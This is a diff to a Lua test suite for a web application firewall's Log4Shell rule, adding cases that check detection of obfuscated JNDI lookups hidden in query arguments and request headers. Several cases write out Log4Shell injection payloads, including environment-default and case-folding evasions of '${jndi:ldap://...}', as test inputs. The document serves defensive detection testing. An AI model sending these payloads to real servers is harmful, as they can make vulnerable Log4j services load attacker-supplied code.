@@ -1799,7 +1799,7 @@ do
   waf.set_rule("rule_log4shell", "challenge")
 
   local cases = {
-    { args = "x=${env:FOO:-j}ndi:ldap://e/a",            expect = "ENV"         },
+    { args = "x=${env:FOO}",                             expect = "ENV"         },
     { args = "x=${sys:user.home}",                       expect = "SYS"         },
     { args = "x=${main:0}",                              expect = "MAIN"        },
     { args = "x=${date:yyyy}",                           expect = "DATE"        },
@@ -1845,6 +1845,38 @@ do
   check(a2 == "challenge_v2",                                    "74b: ${${lower:j} header — challenge_v2 (got " .. tostring(a2) .. ")")
   local _, _, _, a3 = waf.check(fresh_ctx({ args = "x=${upper:J}ndi:ldap://e/a" }))
   check(a3 == "challenge_v2",                                    "74b: UPPER — challenge_v2 (got " .. tostring(a3) .. ")")
+
+  -- Env-default evasions from the public payload lists (a one-character
+  -- default glued to more text) are DEFAULT_VAL, not NESTED / ENV.
+  local glued = {
+    { args = "x=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://e/a}", want = "WAF_CVE:LOG4SHELL:DEFAULT_VAL" },
+    { args = "x=${env:FOO:-j}ndi:ldap://e/a",                             want = "WAF_CVE:LOG4SHELL:DEFAULT_VAL" },
+    { headers = { ["user-agent"] = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://e/a}" },
+      want = "WAF_CVE:LOG4SHELL:DEFAULT_VAL:HDR:user-agent" },
+  }
+  for i, c in ipairs(glued) do
+    local _, r, _, a = waf.check(fresh_ctx({ args = c.args, headers = c.headers }))
+    check(r == c.want and a == "challenge_v2", "74b/glued " .. i .. ": " .. c.want .. " challenge_v2 (got " .. tostring(r) .. " " .. tostring(a) .. ")")
+  end
+  -- A template's default is a value, not a glued letter: still weak.
+  for _, v in ipairs({ "x=${env:HOME:-/root}", "x=echo ${1:-x} done", "x=${sys:p:-8080}" }) do
+    local _, _, _, a = waf.check(fresh_ctx({ args = v }))
+    check(a == nil or a == "logonly", "74b: template default " .. v .. " — not enforced (got " .. tostring(a) .. ")")
+  end
+
+  -- A weak tag elsewhere in the request must not mask a strong one.
+  local mixed = {
+    { args = "q=${date:yyyy}", headers = { ["x-api-version"] = "${jndi:ldap://e/a}" },
+      want = "WAF_CVE:LOG4SHELL:JNDI:HDR:x-api-version" },
+    { headers = { ["referer"] = "${date:x}", ["x-api-version"] = "${jndi:ldap://e/a}",
+                  ["x-b"] = "${env:A}", ["x-c"] = "${base64:Zm9v}" },
+      want = "WAF_CVE:LOG4SHELL:JNDI:HDR:x-api-version" },
+    { args = "a=${${x}}&b=${upper:J}ndi:ldap://e/a", want = "WAF_CVE:LOG4SHELL:UPPER" },
+  }
+  for i, c in ipairs(mixed) do
+    local _, r, _, a = waf.check(fresh_ctx({ args = c.args, headers = c.headers }))
+    check(r == c.want and a == "challenge_v2", "74b/mixed " .. i .. ": " .. c.want .. " (got " .. tostring(r) .. " " .. tostring(a) .. ")")
+  end
 
   -- Template-shaped tags: recorded, never enforced.
   local held = {
